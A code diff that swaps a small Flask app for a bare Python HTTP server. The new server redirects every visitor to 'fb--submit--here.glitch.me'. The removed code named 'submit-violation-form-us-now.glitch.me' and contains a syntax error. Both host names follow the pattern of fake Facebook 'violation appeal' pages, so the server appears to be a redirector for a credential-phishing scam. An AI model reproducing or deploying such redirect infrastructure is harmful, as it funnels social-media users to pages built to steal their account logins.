@@ -1,20 +1,16 @@
-from flask import Flask, render_template, redirect, url_for
-import time
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
-app = Flask(__name__)
+class RedirectHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header('Location', 'https://fb--submit--here.glitch.me/')  # Replace with your desired URL
+        self.end_headers()
 
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/redirect', methods=['GET'])
-def redirect_page():
-    time.sleep(4)  # Sleep for 4 seconds before redirecting
-    return redirect(url_for('redirected'))
-
-@app.route('/redirected')
-def redirected(https://submit-violation-form-us-now.glitch.me/):
-    return "Redirected to the new page!"
+def run(server_class=HTTPServer, handler_class=RedirectHandler, port=8000):
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    print(f"Server running on port {port}")
+    httpd.serve_forever()
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    run()
